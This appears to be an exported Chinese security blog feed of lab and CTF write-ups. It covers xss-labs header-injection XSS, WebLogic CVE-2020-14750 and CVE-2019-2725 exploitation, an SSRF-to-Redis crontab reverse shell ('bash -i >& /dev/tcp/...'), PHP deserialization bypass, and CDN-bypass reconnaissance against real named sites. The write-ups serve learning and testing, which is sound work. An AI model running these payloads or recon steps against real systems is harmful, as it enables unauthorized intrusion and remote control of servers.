<p> 简单来说呢，就是HTTP_REFERER会获取http请求头中的Referer字段，就是我们上一级网页的url。</p>
<p>那么我们就需要使用插件（或者burpsuite 进行抓包），修改Referer字段。</p>
<p>这里我使用了火狐的ModHeader插件修改，同样点击文本框触发事件执行脚本。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick= &quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/fd65d38eaa384a23b77ca8fb5a231838.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><p>网页查看源代码发现了，t_ua 的值为User-Agent，那么我们尝试上一关的方法修改User-Agent</p>
<p><img src="https://img-blog.csdnimg.cn/f0ce69824ce140d190a937fd87f9692f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> ModHeader插件或者burpsuite工具修改User-Agent，同样点击文本框触发</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(/xss/)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/5d978c7f81ca46eaa6bcbb2cc5930ca7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><p><img src="https://img-blog.csdnimg.cn/bfd02cdb99ad4161b953bb87604d50ea.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>分析源码，我们发现了一条语句</p>
<p>$str11=$_COOKIE[“user”];</p>
<p><img src="https://img-blog.csdnimg.cn/c4cb2423cff64d188f7aa4ccb06802b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 所以我们可以修改 cookie 来达到注入的目的</p>
<p> 老样子，使用火狐插件Cookie-Editor或者burpsuite来修改</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(/xss/)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/4da4e902a81e493cbd18016031d3efae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><p>跳过~</p>
<p>查了许多教程大部分都跳过了</p>
<p>据部分教程说与 Exif xss 有关</p>
<p><img src="https://img-blog.csdnimg.cn/6452298b45264c84b4927226432868ac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>在后台发现一个<code>&lt;!--ngInclude: 1.gif--&gt;</code>语句</p>
<p><img src="https://img-blog.csdnimg.cn/1631a3ee38274a7cb9094f4e08fc971a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 分析源码，发现ng-include，很有可能这个指令就是突破口，毕竟也没其他地方可以下手了</p>
<p><img src="https://img-blog.csdnimg.cn/e8b32f63bd804572bf220aad9ffbbc2f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>ng-include指令：</p>
<p><img src="https://img-blog.csdnimg.cn/0fe85790d14b40428d933db473fc9033.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 利用ng-include指令的特性包含一个有漏洞的html文件，注意这里有对尖括号的过滤。</p>
<p>我们可以利用第一关的漏洞完成</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">src=<span class="string">&#x27;http://127.0.0.1/xss-labs/level1.php?name= &quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/f7d64321708541bd8df0dccd39ea6748.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><p><img src="https://img-blog.csdnimg.cn/96a10fe34c984023ae5e5b2b8c0288bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 分析源码</p>
<p>发现这一关得到过滤将空格、反斜杠、script都被str_replace函数替换成&amp;nbsp了</p>
<p>我们可以将%0a或者%0D当成空格使用，在HTML中这样是合法的。</p>
<p><img src="https://img-blog.csdnimg.cn/99f189f8378f4e9b981e87e0635c9b2b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—weblogic-RCE</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94weblogic-RCE/</url>
    <content><![CDATA[<p> 一开始只知道一个IP </p>
<p>212.129.248.63</p>
<p>使用nmap扫描开放的端口</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016704.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>经过尝试 7001端口是我们靶机环境的端口</p>
<span id="more"></span>

<p>使用dirsearch 扫描目录</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016826.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 发现一个登录页面</p>
<p><img src="https://img-blog.csdnimg.cn/cb17d99bb9024225b295da9e11697d4f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>使用 Xary 扫描</p>
<blockquote>
<p>xray_windows_amd64.exe webscan –url <a href="http://212.129.248.63:7001/">http://212.129.248.63:7001/</a> –html-output 1203.html</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dcfe2d0b68a6495ba671b40692a12d80.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>漏洞利用</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016359.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>weblogic-cve-2020-14750</strong></p>
<p>登陆界面 </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016245.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>构造URL绕过登陆</p>
<p>　　<a href="http://id:端口/console/images/%252E./console.porta">http://id:端口/console/images/%252E./console.porta</a></p>
<p>　　这里的%252E是 . 二次url编码的结果</p>
<p>　　成功绕过登陆</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016831.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>weblogic-cve-2019-2725</strong></p>
<p>2019年4月17日，国家信息安全漏洞共享平台（CNVD）收录了由中国民生银行股份有限公司报送的Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814）。由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。根据国家信息安全漏洞共享平台（CNVD）漏洞公告，此漏洞存在于异步通讯服务，可通过访问路径/_async/AsyncResponseService，判断不安全组件是否开启。目前可以在网上搜索到POC,CVE编号为（CVE-2019-2725）。</p>
<p> wls9-async组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令。</p>
<p>可通过访问路径/_async/AsyncResponseService判断wls9_async_response组件是否存在。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016012.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可通过访问路径/wls-wsat/CoordinatorPortType判断wls-wsat组件是否存在。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081016372.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>在github上下载漏洞利用工具</p>
<p><a href="https://github.com/TopScrew/CVE-2019-2725">GitHub - TopScrew/CVE-2019-2725: CVE-2019-2725命令回显+webshell上传+最新绕过</a></p>
<blockquote>
<p>python3 weblogic-2019-2725.py 10.3.6 <a href="http://212.129.248.63:7001/">http://212.129.248.63:7001</a> whoami </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/35d90859118f49a2a0f1dd58f5130954.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub漏洞—weblogic-SSRF</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94weblogic-SSRF/</url>
    <content><![CDATA[<p>文接上回</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121689242?spm=1001.2014.3001.5501">vubhub漏洞—weblogic RCE_ErYao7的博客-CSDN博客一开始只知道一个IP212.129.248.63使用nmap扫描开放的端口经过尝试我们发现 7001 端口是我们的要打的靶机漏洞使用 Xary 扫描xray_windows_amd64.exe webscan –url http://212.129.248.63:7001/ –html-output 1203.html漏洞利用…<img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021980.x-icon" alt=" ">https://blog.csdn.net/weixin_45808483/article/details/121689242?spm=1001.2014.3001.5501</a></p>
<p>Xray扫描</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021197.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><a href="https://github.com/rabbitmask/WeblogicScan">WeblogicScan扫描<img src="https://csdnimg.cn/release/blog_editor_html/release1.9.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=LA92" alt=" ">https://github.com/rabbitmask/WeblogicScan</a><img src="https://img-blog.csdnimg.cn/f05da6766c0a4f2b9e54ffe4012277b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

<h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>SSRF漏洞存在于 <a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021098.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 向服务器提交以下参数</p>
<p>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001/">http://127.0.0.1:7001</a></p>
<p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回：did not have a valid SOAP content-type</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021306.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>正常我们是无法访问内网的，但是通过页面返回错误的不同，我们可以探测内网端口的开放状态，进而知道内网</p>
<p>开启的服务，同时加以利用</p>
<h1 id="注入HTTP头，利用Redis反弹Shell"><a href="#注入HTTP头，利用Redis反弹Shell" class="headerlink" title="注入HTTP头，利用Redis反弹Shell"></a>注入HTTP头，利用Redis反弹Shell</h1><p>Weblogic的SSRF有一个比较大的特点，我们可以通过传入%0D%0A来注入换行符，</p>
<p>而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>首先，通过ssrf探测内网中的redis服务器，应为这个漏洞是用docker环境搭建的，所以redis服务器的内网即是</p>
<p>docker的网段（docker环境的网段一般是172.*）：</p>
<p>我这里的靶机上的docker环境的网段是 172.21.0.2（可以通过脚本跑，我并没有拿脚本跑出来，所以直接就在靶机上看了一下）</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021581.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<p>dev/tcp / 反弹目标的ip / 端口</p>
<blockquote>
<p>set 1 “\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/123.56.82.231/21 0&gt;&amp;1\n\n\n\n”<br> config set dir /etc/<br> config set dbfilename crontab<br> save</p>
</blockquote>
<p>把这三条命令通过POST包注入进去，先要将命令用url进行编码</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021421.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 再将编码后payload中的%0A替换成%0D%0A，前面提到了</p>
<p>redis是通过换行符来分隔每条命令</p>
<blockquote>
<p>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.56.82.231%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</p>
</blockquote>
<p>在反弹的目标上监听21端口，等待连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 21 </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081021894.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="成功执行-ps-命令-，看到了-redis-server-进程"><a href="#成功执行-ps-命令-，看到了-redis-server-进程" class="headerlink" title="成功执行 ps 命令 ，看到了 redis-server 进程"></a>成功执行 ps 命令 ，看到了 redis-server 进程</h1>]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集-绕过CDN</title>
    <url>/2022/01/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%BB%95%E8%BF%87CDN/</url>
    <content><![CDATA[<h1 id="1-如何判断目标存在CDN服务？"><a href="#1-如何判断目标存在CDN服务？" class="headerlink" title="1.如何判断目标存在CDN服务？"></a>1.如何判断目标存在CDN服务？</h1><p>​    利用多节点技术进行请求返回判断</p>
<h1 id="2-目前常见的CDN绕过技术有哪些？"><a href="#2-目前常见的CDN绕过技术有哪些？" class="headerlink" title="2.目前常见的CDN绕过技术有哪些？"></a>2.目前常见的CDN绕过技术有哪些？</h1><p>​    子域名查询</p>
<p>​    邮件服务查询</p>
<p>​    国外地址请求</p>
<p>​    遗留文件，扫描全网</p>
<p>​    黑暗引擎搜索特定文件 -&gt; shodan,zoomeye,fofa</p>
<p>​    dns历史记录，以量打量</p>
<h1 id="3-CDN真是IP地址获取后绑定指向地址"><a href="#3-CDN真是IP地址获取后绑定指向地址" class="headerlink" title="3.CDN真是IP地址获取后绑定指向地址"></a>3.CDN真是IP地址获取后绑定指向地址</h1><p>​    更改本地HOSTS解析指向文件</p>
<h1 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h1><h2 id="子域名小技巧"><a href="#子域名小技巧" class="headerlink" title="子域名小技巧"></a>子域名小技巧</h2><p>与CDN解析相关，<a href="http://www.xueersi.com/">www.xueersi.com</a> 设置了CDN服务，而 xueersi.com 没有设置CDN服务    </p>
<p>超级ping： <a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
<p><a href="http://www.xueersi.com/">www.xueersi.com</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021557805.png" alt="image-20220102155745638"></p>
<p>xueersi.com</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021559566.png" alt="image-20220102155901460"></p>
<h2 id="DNS历史记录-第三方接口（接口查询）"><a href="#DNS历史记录-第三方接口（接口查询）" class="headerlink" title="DNS历史记录=第三方接口（接口查询）"></a>DNS历史记录=第三方接口（接口查询）</h2><p>Get Site IP</p>
<p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021609258.png" alt="image-20220102160941115"></p>
<p>微步在线情报社区</p>
<p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p>通过历史解析记录可能找到网站未作CDN服务时解析的IP（仅供参考，不一定准确）</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021617617.png" alt="image-20220102161759517"></p>
<h2 id="子域名小技巧-采集-国外请求（同类型访问）"><a href="#子域名小技巧-采集-国外请求（同类型访问）" class="headerlink" title="子域名小技巧/采集/国外请求（同类型访问）"></a>子域名小技巧/采集/国外请求（同类型访问）</h2><p>手机站点与PC站点访问到的内容以及功能是一样的，但是访问的域名可能不同，例如百度 手机站点为m.baidu.com</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021624053.png" alt="image-20220102162427978"></p>
<p>先超级ping一下 <a href="http://www.sp910.com/">www.sp910.com</a> 存在CDN服务</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021642301.png" alt="image-20220102164217183"></p>
<p>补充一个子域名采集</p>
<p>子域名查询网站 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021657294.png" alt="image-20220102165757226"></p>
<p>在ping m.sp910.com</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021643109.png" alt="image-20220102164345010"></p>
<p>海外ping</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021702659.png" alt="image-20220102170215575"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021702452.png" alt="image-20220102170232380"></p>
<h2 id="邮箱源码测试对比第三方查询（地区分析）"><a href="#邮箱源码测试对比第三方查询（地区分析）" class="headerlink" title="邮箱源码测试对比第三方查询（地区分析）"></a>邮箱源码测试对比第三方查询（地区分析）</h2><p>mozhe.cn</p>
<p>多地ping ，发现存在CDN</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021740535.png" alt="image-20220102174029413"></p>
<p>我们注册一个账号并绑定邮箱，墨者服务器会为给我们发送邮件，我们查看邮件信头，我使用的163.邮箱（信头查看）</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021747466.png" alt="image-20220102174714395"></p>
<p>ip地址为重庆</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021748283.png" alt="image-20220102174811223"></p>
<p>我们在使用Get Site IP查询IP,我们两个IP不一致</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021752213.png" alt="image-20220102175229101"></p>
<p>查询该ip地址，为浙江</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201021753629.png" alt="image-20220102175314579"></p>
<p>那个正确呢？我们可以查询该网站的备案信息，渝=重庆，说明我们通过邮件查到的IP是正确的。</p>
<p>说明第三方工具不一定靠谱，还是需要我们去验证一下。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201022312636.png" alt="image-20220102231224499"></p>
<h2 id="Shodan搜索指定hash文件"><a href="#Shodan搜索指定hash文件" class="headerlink" title="Shodan搜索指定hash文件"></a>Shodan搜索指定hash文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.xxx.com/favicon.ico&#x27;</span>)</span><br><span class="line">favicon = base64.b64encode(response.content)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>))</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>攻防世界Web进阶—unserialize3</title>
    <url>/2021/12/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E8%BF%9B%E9%98%B6%E2%80%94unserialize3/</url>
    <content><![CDATA[<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1</a></p>
<h1 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h1><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092109706.png" alt="image-20211209210904638"></p>
<span id="more"></span>

<h1 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h1><p>代码定义了一个类，其中有一个方法 <em>wakeup() , _wakeup()会直接退出，并输出” bad requests “ 末尾有” ?code= “ 看样子是要构造url来绕过wakeup()这个函数了。</em></p>
<p><em>当对一个对象序列化时，php就会调用__sleep方法（如果存在的话），在反序列化时，php就会调用__wakeup方法（如果存在的话）。</em></p>
<p>我们将序列化后的对象字符串为<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>直接将它赋给code试试</p>
<p>显示了bad requests</p>
<p>传入的code会被unserialize()反序列化，这样的化，我们的目的就是避免执行_weakup()函数</p>
<p>我们修改长度，反序列化时便会报错</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>构造url为：</p>
<p><code>?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112092131699.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>极客大挑战2019_Upload</title>
    <url>/2021/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Upload/</url>
    <content><![CDATA[<p> 网址：</p>
<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测</a></p>
<p>题目</p>
<p><img src="https://img-blog.csdnimg.cn/709359c1c19a468d96db417fbf260895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_9,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

